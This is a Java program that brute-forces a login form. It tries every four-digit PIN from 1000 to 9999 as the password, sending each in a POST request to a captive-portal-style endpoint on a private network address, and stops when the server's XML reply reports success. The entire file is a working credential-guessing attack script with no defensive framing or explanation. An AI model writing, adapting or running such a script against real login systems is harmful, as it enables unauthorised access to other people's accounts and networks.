import java.net.*;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;
public class demo{

  public static void main(String arg[]){
try{	
     String username="";

     String password="bgh"; 
	String ss="successfully";
 	 int k; 
	for(int i=1000;i<=9999;i++)
         {k=i; 
           password=Integer.toString(i) ;
	   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
	   DocumentBuilder builder = factory.newDocumentBuilder();
       String Data = "mode=191&username="+username+"&password="+password;
       URL url = new URL("http://10.1.0.7:8090/httpclient.html");
       HttpURLConnection con = (HttpURLConnection) url.openConnection();
       con.setRequestMethod("POST");
       con.setDoOutput(true);
       con.getOutputStream().write(Data.getBytes("UTF-8"));
	   Document doc = builder.parse(con.getInputStream());
	   NodeList list = doc.getElementsByTagName("message");
      String s[]=(list.item(0).getTextContent()).toString().split(" ");
      System.out.println(i);
      System.out.println(s[2]);
      if(s[2].equals(ss))
        break;}
         System.out.println(username+" "+password);
       
    }
catch(Exception e){System.out.println(e);}    
}  
}